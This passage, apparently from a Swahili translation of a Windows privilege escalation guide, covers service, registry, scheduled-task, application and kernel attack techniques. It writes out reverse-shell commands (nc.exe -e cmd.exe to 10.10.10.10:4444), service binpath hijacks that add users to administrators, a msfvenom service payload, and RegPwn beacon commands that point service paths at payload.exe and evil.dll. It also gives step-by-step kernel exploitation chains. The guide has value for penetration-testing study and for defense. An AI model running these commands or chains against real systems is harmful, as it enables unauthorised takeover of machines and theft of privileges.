**Zingatia kwamba huduma ya upnphost inategemea SSDPSRV ili ifanye kazi (kwa XP SP1)**

**Njia nyingine ya kutatua** tatizo hili ni kuendesha:

```
sc.exe config usosvc start= auto
```

### **Badilisha njia ya binary ya service**

Katika hali ambapo kundi la "Authenticated users" lina **SERVICE_ALL_ACCESS** kwenye service, inawezekana kurekebisha binary inayoweza kutekelezwa ya service. Ili kurekebisha na kutekeleza **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Anzisha upya huduma

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privileges zinaweza kuongezwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Huruhusu kusanidi upya binary ya service.
- **WRITE_DAC**: Huruhusu kusanidi upya ruhusa, na hivyo kuwezesha kubadilisha usanidi wa service.
- **WRITE_OWNER**: Huruhusu kupata umiliki na kusanidi upya ruhusa.
- **GENERIC_WRITE**: Hurithi uwezo wa kubadilisha usanidi wa service.
- **GENERIC_ALL**: Pia hurithi uwezo wa kubadilisha usanidi wa service.

Kwa kutambua na kutumia vulnerability hii, unaweza kutumia _exploit/windows/local/service_permissions_.

### Ruhusa dhaifu kwenye binary za services

Ikiwa service inaendeshwa kama **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, au akaunti ya domain yenye mamlaka ya juu, lakini **watumiaji wenye ruhusa chache wanaweza kurekebisha EXE ya service au folda yake ya mzazi**, service mara nyingi inaweza kutekwa kwa **kubadilisha binary na kuwasha upya service**.

**Angalia kama unaweza kurekebisha binary inayoendeshwa na service** au kama una **ruhusa za kuandika kwenye folda** ambako binary hiyo ipo ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata binary zote zinazoendeshwa na service kwa kutumia **wmic** (si katika system32) na kuangalia ruhusa zako kwa kutumia **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Unaweza pia kutumia **sc** na **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Tafuta ACL hatari zilizotolewa kwa **`Everyone`**, **`BUILTIN\Users`**, au **`Authenticated Users`**, hasa **`(F)`**, **`(M)`**, au **`(W)`** kwenye executable ya huduma au kwenye saraka inayoihifadhi. Mfuatano wa vitendo wa kutumia vibaya hali hii ni:<sup>[[27]](#references)</sup>

1. Thibitisha akaunti ya huduma na njia ya executable kwa kutumia `sc qc <service_name>`.
2. Thibitisha kuwa binary inaweza kuandikwa kwa kutumia `icacls <path>`.
3. Badilisha binary ya huduma kwa payload au binary halali lakini hasidi ya huduma.
4. Anzisha upya huduma kwa kutumia `sc stop <service_name> && sc start <service_name>` (au subiri kuwashwa upya kwa mfumo / kichochezi cha huduma).

Ukaguzi wa kiotomatiki unaofaa:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ikiwa huduma hairuhusu mtumiaji wa kawaida kuiwasha upya, angalia ikiwa huanza kiotomatiki wakati wa kuwasha mfumo, ina hatua ya kushughulikia hitilafu inayoianzisha upya, au inaweza kuwashwa kwa njia isiyo ya moja kwa moja na programu inayoitumia.

### Ruhusa za kurekebisha registry ya huduma

Unapaswa kuangalia ikiwa unaweza kurekebisha registry yoyote ya huduma.\
Unaweza **kuangalia** **ruhusa** zako kwenye **registry** ya huduma kwa kufanya:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Jaribio la awali la ruhusa lilielezwa hivi:

Inapaswa kuangaliwa ikiwa **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** zina ruhusa za `FullControl`. Ikiwa ndivyo, binary inayotekelezwa na service inaweza kubadilishwa.

Kagua ikiwa **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** zina ruhusa za registry zinazowezesha kuandika kwenye key fulani ya service. Ingizo la ACL pekee halithibitishi ufikiaji unaotumika: ingizo za deny, token ya sasa na ruhusa zilizorithiwa ni muhimu. Haki za registry key ni tofauti na haki za service object za `SERVICE_CHANGE_CONFIG` na `SERVICE_START`. Escalation pia inahitaji sehemu ya usanidi wa service inayoweza kutumika, njia ya kuiwasha service, na service identity yenye mapendeleo ya juu zaidi. Angalia [haki za registry key](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) na [marejeleo ya haki za ufikiaji wa service](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) ya Microsoft.

Ili kubadilisha Path ya binary inayotekelezwa:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race ya kuandika thamani yoyote ya HKLM (ATConfig)

Baadhi ya vipengele vya Accessibility vya Windows huunda funguo za **ATConfig** za kila mtumiaji, ambazo baadaye zinakiliwa na mchakato wa **SYSTEM** kwenye ufunguo wa kipindi wa HKLM. **Symbolic link race** ya Registry inaweza kuelekeza uandishi huo wa kiwango cha juu kwenye **njia yoyote ya HKLM**, na hivyo kutoa uwezo wa kuandika **thamani yoyote ya HKLM**.<sup>[[18]](#references)</sup>

Maeneo muhimu (mfano: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha vipengele vya Accessibility vilivyosakinishwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` huhifadhi usanidi unaodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa kuingia au mabadiliko ya secure-desktop na mtumiaji anaweza kuiandikia.

Mtiririko wa matumizi mabaya (CVE-2026-24291 / ATConfig):

1. Weka thamani ya **HKCU ATConfig** unayotaka iandikwe na SYSTEM.
2. Anzisha nakala ya secure-desktop (kwa mfano, **LockWorkstation**), ambayo huanzisha mtiririko wa AT broker.
3. **Shinda race** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock inapowashwa, badilisha ufunguo wa **HKLM Session ATConfig** kuwa **registry link** inayoelekeza kwenye lengo la HKLM lililolindwa.
4. SYSTEM huandika thamani iliyochaguliwa na mshambuliaji kwenye njia ya HKLM iliyoelekezwa upya.

Baada ya kupata uwezo wa kuandika thamani yoyote ya HKLM, tumia hilo kupata LPE kwa kubadilisha thamani za usanidi wa huduma:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua huduma ambayo mtumiaji wa kawaida anaweza kuanzisha (kwa mfano, **`msiserver`**) na uiwashe baada ya uandishi. **Kumbuka:** utekelezaji wa exploit wa umma **hufunga workstation** kama sehemu ya race.

Zana za mfano (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Ikiwa una ruhusa hii kwenye registry, inamaanisha **unaweza kuunda sub registries kutoka kwenye registry hii**. Kwa huduma za Windows, hii **inatosha kutekeleza code yoyote:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ikiwa path ya executable haijawekwa ndani ya alama za nukuu, Windows itajaribu kutekeleza kila sehemu inayoishia kabla ya nafasi.

Kwa mfano, kwa path _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Orodhesha njia zote za huduma zisizowekwa kwenye alama za nukuu, ukiondoa zile za huduma za Windows zilizojengewa ndani:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Unaweza kugundua na ku-exploit** udhaifu huu kwa kutumia metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda binary ya service mwenyewe kwa kutumia metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Vitendo vya Urejeshaji

Windows huruhusu watumiaji kubainisha vitendo vya kutekelezwa huduma inaposhindwa. Kipengele hiki kinaweza kusanidiwa kuelekeza kwenye binary. Ikiwa binary hii inaweza kubadilishwa, huenda uwezekano wa privilege escalation ukapatikana. Maelezo zaidi yanapatikana kwenye [nyaraka rasmi](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Faili lengwa za script za scheduled task

Kwa task iliyowezeshwa inayoendesha `cmd.exe /c` pamoja na faili ya `.bat` au `.cmd`, kagua script iliyotajwa kwenye **action arguments** na pia `cmd.exe`. Hali hiyo hiyo inatumika kwa argument ya faili iliyobainishwa wazi kwa interpreter, kama vile PowerShell `-File`. Ikiwa faili ya batch ya scheduled task ina mwito halisi wa PowerShell `-File`, kagua pia ACL ya script iliyorejelewa; kufuatilia variables, conditionals, na uunganishaji wa amri za shell kunahitaji uchunguzi wa mwongozo. Script au saraka mama inayoweza kuandikwa na caller ni mwanya wa uchunguzi wa cross-account execution tu ikiwa task principal iliyosanidiwa ni tofauti na caller na task inafikia action hiyo kwa kweli. ACL inayoruhusu kuongeza maudhui pekee inaweza kuwa muhimu kwa scripts, lakini `exit` ya awali au mtiririko mwingine wa udhibiti unaweza kufanya mistari iliyoongezwa isifikiwe. Thibitisha ACL zinazotumika, [task execution context](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), working directory, trigger, na sera ya application-control kabla ya kudai kuwa privilege escalation inawezekana. Orodhesha bila kurekebisha script au kuanzisha task.

## Named streams kwenye faili zinazoweza kufikiwa

Kwenye NTFS, faili inayosomeka inaweza kuwa na stream yenye jina la `:$DATA`, ambayo maudhui yake hayaonyeshwi kwenye orodha ya kawaida ya saraka. Kwa seti ndogo na husika ya faili za backup au usanidi zinazoweza kufikiwa, kagua **majina na ukubwa** wa streams kabla ya kufungua maudhui yoyote; Windows huzionyesha kupitia [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), na PowerShell kupitia [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Jina la stream linalodokeza kuwa na siri ni mwanya wa uchunguzi tu. Kagua ruhusa halisi ya kusoma faili, uwezo wa filesystem kutumia streams, iwapo stream ina credentials zinazoweza kutumika, na akaunti ambayo credentials hizo huithibitisha. Epuka kuchanganua streams kwa kujirudia kwenye saraka nzima na kuchapisha maudhui ya streams wakati wa uorodheshaji wa kawaida.

## Ingizo saidizi za Windows Driver Kit za scheduled task

Windows Driver Kit ya hiari inajumuisha `StandaloneRunner.exe`, inayoweza kutumia faili za `command.txt`, `reboot.rsf`, na `working\rsf.rsf` za project kutoka kwenye run directory yake. Scheduled task au service inayoanzisha helper hii kwa akaunti yenye privileged inaweza kugeuza ruhusa ya kiwango cha chini ya kuandika kwenye ingizo hizo kuwa utekelezaji wa amri katika muktadha wa akaunti hiyo, hata ikiwa executable ya helper yenyewe imelindwa. Thibitisha kuwa kuna mtumiaji mwenye privileged anayezitumia na kwamba **faili zote mbili** za sidecar zinaweza kuundwa au kurekebishwa; kuipata helper pekee haitoshi.

Kwa scheduled task, kagua [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) ya action yake na ACL za njia mbili za sidecar. Ikiwa task haijabainisha working directory, saraka ya executable ni mwanya wa kuthibitisha tu, si ushahidi wa mahali task inaposoma ingizo zake. Sharti la faili ya working ya project lazima pia litimizwe. Kagua task principal halisi badala ya kudhani kuwa inaendeshwa kama SYSTEM.

## Applications

### Applications Zilizosakinishwa

Kagua **ruhusa za binaries** (huenda unaweza kubadilisha moja na kupata privilege escalation) na za **folders** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Njia ya kurekebisha agent ya Windows ya Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) huathiri agent za zamani za Checkmk za Windows ambazo ziliandika faili za amri kwenye `C:\Windows\Temp` kisha kutekeleza faili iliyokuwepo hapo awali na iliyolindwa dhidi ya uandishi, baada ya jaribio la kuibadilisha kushindwa. Vendor alirekebisha tatizo katika 2.1.0p40, 2.2.0p23, 2.3.0b1, na 2.4.0b1. Kagua kiwango kamili cha patch kilichosakinishwa na kama operesheni ya agent iliyoathiriwa inaweza kuendeshwa; lebo ya tawi pekee, kama `2.1`, haiwezi kuthibitisha uwepo wa hatari. Ukusanyaji wa taarifa unaweza kukagua toleo, hali ya service, na ruhusa za Temp bila kuunda faili au kuwasha amri za agent.

#### Ukaguzi wa service ya SAML ya ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) iliathiri build 6210 na matoleo ya awali ya ADSelfService Plus; vendor alirekebisha tatizo katika build 6211. Inahusika tu ikiwa SAML SSO **imewezeshwa au iliwezeshwa hapo awali**. Kwa hivyo, ingizo la bidhaa iliyosakinishwa au njia ya service ni kidokezo, si uthibitisho wa athari: thibitisha build halisi, historia ya usanidi wa SAML, ufikikaji wa service kupitia mtandao, na akaunti inayoitumia. Utekelezaji wa code kupitia service hurithi ruhusa za akaunti hiyo; utekelezaji wa SYSTEM unahitaji instance inayoendeshwa kama SYSTEM. Faili ya `OfflineBackup_*.ezip` inayosomeka kwenye saraka ya Backup ya bidhaa ni kidokezo tofauti cha backup iliyosimbwa kwa njia fiche, si ushahidi wa credential inayoweza kutumika au dosari hii ya SAML. Rekodi njia yake na ruhusa za ufikiaji bila kuifungua wakati wa ukusanyaji wa kawaida wa taarifa.

#### Mipaka ya Jenkins controller na akaunti za domain

Kwenye Jenkins controller ya Windows, tofautisha ruhusa ya kuunda au kusanidi job na ruhusa ya kuiwasha: [Jenkins inaeleza kuwa hizi ni ruhusa tofauti za `Job/Create`, `Job/Configure`, na `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ratiba iliyosanidiwa au trigger ya mbali inaweza kutoa njia nyingine ya kuendesha build, lakini thibitisha kuwa imewezeshwa na build inaendeshwa kweli. Utekelezaji hutumia utambulisho wa controller au agent iliyochaguliwa, na credential iliyohifadhiwa inaweza kutumika tu ikiwa job inaweza kufikia scope yake. Kando na hilo, kagua ufikiaji wa metadata ya `JENKINS_HOME`: Jenkins huhifadhi taarifa za credential na funguo za usimbaji fiche katika `credentials.xml`, `secrets/hudson.util.Secret`, na `secrets/master.key` ([hifadhi ya siri za Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Kuwepo kwao pekee hakufichui password; thibitisha **ruhusa ya kusoma faili zinazohitajika** na njia tofauti ya kutumia tena akaunti, bila kuchapisha siri kwenye matokeo yanayoshirikiwa. Ikiwa akaunti hiyo ina ruhusa ya kuandika `scriptPath` ya AD user-object, thibitisha kuwa script path inaweza kuandikwa na kuna logon halisi au consumer iliyoratibiwa inayoendeshwa kama mtumiaji lengwa, kabla ya kuihesabu kama utekelezaji wa mtumiaji mwingine. Udhibiti zaidi wa group unahitaji uthibitishaji tofauti wa ruhusa za AD zinazotumika.

#### Utambulisho wa agent ya Azure Pipelines self-hosted

Kwa mradi wa Azure DevOps Server au Azure Pipelines, tofautisha ruhusa ya **kuunda au kuhariri** pipeline na ruhusa ya **kuipanga iendeshwe** na kutumia agent pool iliyochaguliwa; [Microsoft inaeleza ruhusa za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) na [idhini ya pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) kando. Ikiwa akaunti yenye ruhusa chache inaweza kuwasilisha hatua ya script na kuendesha pipeline hiyo kwenye agent ya Windows self-hosted, hatua hiyo hutekelezwa kama [akaunti ya operating system iliyosanidiwa kwa agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Thibitisha pipeline halisi, vizuizi vya branch/resource, pool iliyoidhinishwa, job inayoweza kuendeshwa, na utambulisho wa service ya agent kabla ya kudai mpito wa mtumiaji mwingine au SYSTEM. Agent iliyosakinishwa, role ya mradi, au ruhusa ya kuandika kwenye repository ni vidokezo tu; kagua ruhusa na metadata ya service ya ndani bila kuanzisha build wakati wa ukusanyaji wa taarifa usiohusisha mabadiliko.

#### Credentials za Microsoft Entra Connect Sync

[Microsoft inatofautisha](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **akaunti ya service ya ADSync**, inayoendesha service ya usawazishaji na kufikia database yake ya SQL, na **akaunti ya AD DS connector**, ambayo ruhusa zake za directory hutegemea vipengele vya sync vilivyosaniwa. Credentials za connector huhifadhiwa zikiwa zimesimbwa kwa njia fiche katika database hiyo, huku nyenzo za ufunguo [zikilindwa na DPAPI chini ya akaunti ya service ya ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Service ya sync iliyosakinishwa, group inayosikika kama ya local administrator, au uwezo wa kuona database pekee haviwezi kuthibitisha kuwa credential inaweza kufumbuliwa au kuwa kuna njia ya kupanda ruhusa za domain. Kagua kando ruhusa halisi za kusoma database, ufikiaji wa akaunti ya service na ufunguo, mpangilio wa usakinishaji na SQL, utambulisho wa connector uliosanidiwa, na ruhusa halisi za utambulisho huo kwenye AD. Ukusanyaji wa kawaida wa taarifa unapaswa kuonyesha metadata ya service na ufikiaji pekee, si kuuliza au kuchapisha siri zilizohifadhiwa.

#### Ruhusa za DLL saidizi za printer driver

Printer driver iliyosakinishwa inaweza kuhifadhi DLL saidizi chini ya `C:\ProgramData` na kuzipakia kwenye print process yenye ruhusa za juu zaidi. Kagua saraka halisi ya driver na ACL za DLL, ikijumuisha saraka za juu na reparse points, hata kama ruhusa za kuorodhesha printer kupitia WMI zimekataliwa. Kwa [tatizo la Ricoh printer-driver CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), njia iliyoripotiwa ilikuwa `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [ufichuzi wa awali](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) unaeleza upakiaji wa DLL na `PrintIsolationHost.exe`. ACL inayoruhusu uandishi ni kidokezo tu: thibitisha ruhusa halisi ya kuandika baada ya kuzingatia deny entries, kuwa driver husika imesakinishwa na inapakia faili hiyo chini ya utambulisho wenye ruhusa za juu, na kama driver iliyosasishwa au programu ya usalama ya vendor imerekebisha usakinishaji. Usihitimishe kuwa kuna athari kutokana na jina la saraka au toleo la driver pekee.

### Ruhusa za Kuandika

Kagua kama unaweza kurekebisha faili fulani ya usanidi ili kusoma faili maalum, au kama unaweza kurekebisha binary itakayoendeshwa na akaunti ya Administrator (schedtasks).

Njia moja ya kutafuta folda/faili zenye ruhusa dhaifu kwenye mfumo ni kufanya:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/utekelezaji

Notepad++ hupakia kiotomatiki DLL yoyote ya plugin iliyo ndani ya folda zake ndogo za `plugins`. Ikiwa kuna usakinishaji unaobebeka/nakala unaoweza kuandikiwa, kuweka plugin hasidi kunafanya code itekelezwe kiotomatiki ndani ya `notepad++.exe` kila inapozinduliwa (ikiwemo kutoka kwa `DllMain` na callbacks za plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Endesha wakati wa kuwasha

**Angalia kama unaweza kubatilisha registry au binary fulani itakayoendeshwa na mtumiaji mwingine.**\
**Soma** **ukurasa ufuatao** ili ujifunze zaidi kuhusu **maeneo ya autoruns yanayoweza kutumika kuongeza privileges**:

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Tafuta drivers zinazoweza kuwa **za wahusika wengine, zisizo za kawaida/zilizo hatarishi**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ikiwa driver inafichua primitive ya kusoma/kuandika kernel kiholela (jambo la kawaida katika vishikio vya IOCTL vilivyoundwa vibaya), unaweza kupata mamlaka ya juu kwa kuiba token ya SYSTEM moja kwa moja kutoka kwenye kumbukumbu ya kernel.<sup>[[13]](#references)</sup> Tazama mbinu ya hatua kwa hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Nyenzo zinazohusiana na unyonyaji wa kernel ya Windows:

Kwa mfano wa kernel-mode ring-buffer wenye rejista za kusoma/kuandika zinazoweza kuandikwa na user, tazama [USB MIDI looped-streaming variant](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Kwa hitilafu za race condition ambapo mwito ulio hatarini hufungua njia ya Object Manager inayodhibitiwa na mshambuliaji, kupunguza kasi ya utafutaji kimakusudi (kwa kutumia vipengele vya urefu wa juu au minyororo mirefu ya saraka) kunaweza kupanua muda wa fursa kutoka mikrosekunde hadi makumi ya mikrosekunde:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### UAF za cancel-safe queue, ufichuzi wa paged-pool, na I/O ring pivots

Baadhi ya minyororo ya Windows kernel LPE inaweza kujengwa kutokana na hitilafu mbili dhaifu kila moja: **race ya muda wa maisha ya cancel-safe queue** inayofuta request/CBD wakati lock ya queue bado imeshikiliwa, na ufichuzi wa **kuachilia lock kabla ya kunakili** unaovujisha allocation ya paged-pool iliyofutwa wakati wa `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Maelezo ya ukaguzi na unyonyaji:

- **Kufuta chini ya lock + cancel baadaye**: tafuta njia ya mafanikio inayofanya **Acquire -> CompleteRequest/free -> Release**, huku njia ya cancel ikifanya **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ikiwa njia ya mafanikio inafikia `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` kabla ya kuachilia lock ya CBDQ/CSQ, thread iliyozuiwa katika `NtCancelIoFileEx -> IopCsqCancelRoutine` inaweza kuendelea baadaye na kupitisha `PFLT_CALLBACK_DATA` iliyofutwa kwenye callback ya remove ya driver.
- **Reclaim kitu cha queue kilichofutwa** kwa allocation ya paged-pool inayodhibitiwa na mshambuliaji na yenye ukubwa sawa. `NPFS` Data Queue Entries zinafaa kwa sababu payload na ukubwa wake vinaweza kudhibitiwa, na unaweza kuvichunguza baadaye kwa operesheni za pipe read/peek. Ikiwa kitu kilichofutwa kina list links, zibadilishe ziwe **mzunguko wa fake request nodes kwenye user memory** ili driver iendelee kuchakata request structures zilizobainishwa na mshambuliaji badala ya kusimama kwenye kichwa cha awali cha orodha.
- **Boresha write inayotabirika**: ikiwa fake request inaelekeza upya pointer ya nested context inayotumiwa na bookkeeping writes (timestamps / QPC / sehemu zilizo karibu na refcount), unaweza kupata kernel write inayodhibiti anwani lakini si thamani. Katika hali hiyo, lenga sehemu ya **length/size** ya sprayed pool object badala ya pointer ya mwisho ya code/data, kisha kagua spray yote hadi kitu kilichoharibiwa kitoe **usomaji wa paged-pool nje ya mipaka**.
- **Muundo wa ufichuzi unaoweza kushambuliwa kwa race**: syscall yoyote inayofanya `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ni mgombea mzuri. Uaminifu huongezeka ikiwa mshambuliaji anaweza kuongeza ukubwa wa buffer inayokopiwa (kwa mfano, kwa kuongeza list/resource entries nyingi zinazoongeza ukubwa wa mwisho wa allocation ya serializer), kwa sababu kunakili kwa muda mrefu zaidi hupanua dirisha la kubadilisha bila lazima kuangusha mashine.
- **Malengo ya kujaza upya yaliyojaa pointer**: Windows **I/O ring** registered-buffer arrays ni malengo bora ya ufichuzi kwa sababu ukubwa wake wa paged-pool unaweza kudhibitiwa na mshambuliaji (`8 * regBufferCnt`), na kila kipengele ni kernel pointer ya `_IOP_MC_BUFFER_ENTRY`. Vujisha moja ya arrays hizi, tambua `IORING_OBJECT` inayoizunguka, kisha haribu **`RegBuffers`** na **`RegBuffersCount`** ili operesheni zinazofuata za I/O ring zitumie entries zilizoghushiwa na mshambuliaji na kutoa usomaji/uandishi holela wa kernel. Ikiwa write pekee inayopatikana inakupa byte thabiti (kwa mfano kutoka `KUSER_SHARED_DATA+0x14`), tumia **overlapping unaligned writes** kujenga user pointer ya byte inayojirudia kama `0x0101010101010101`, ipakie kwa `VirtualAlloc`, kisha uweke registered-buffer array iliyoghushiwa hapo.<sup>[[30]](#references)</sup>

Viashiria muhimu vya utatuzi:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Baada ya kupata arbitrary kernel read/write kutoka kwa I/O ring iliyoharibika, iba SYSTEM token ukitumia workflow ya kawaida ya baada ya kupata primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives za memory corruption za Registry hive

Udhaifu wa kisasa wa hive hukuwezesha kupanga layouts zinazotabirika, kutumia descendants za HKLM/HKU zinazoweza kuandikwa, na kubadilisha memory corruption ya metadata kuwa overflows za kernel paged-pool bila driver maalum. Jifunze mnyororo mzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type confusion ya direct-mode ya `RtlQueryRegistryValues` kupitia paths zinazodhibitiwa na mshambuliaji

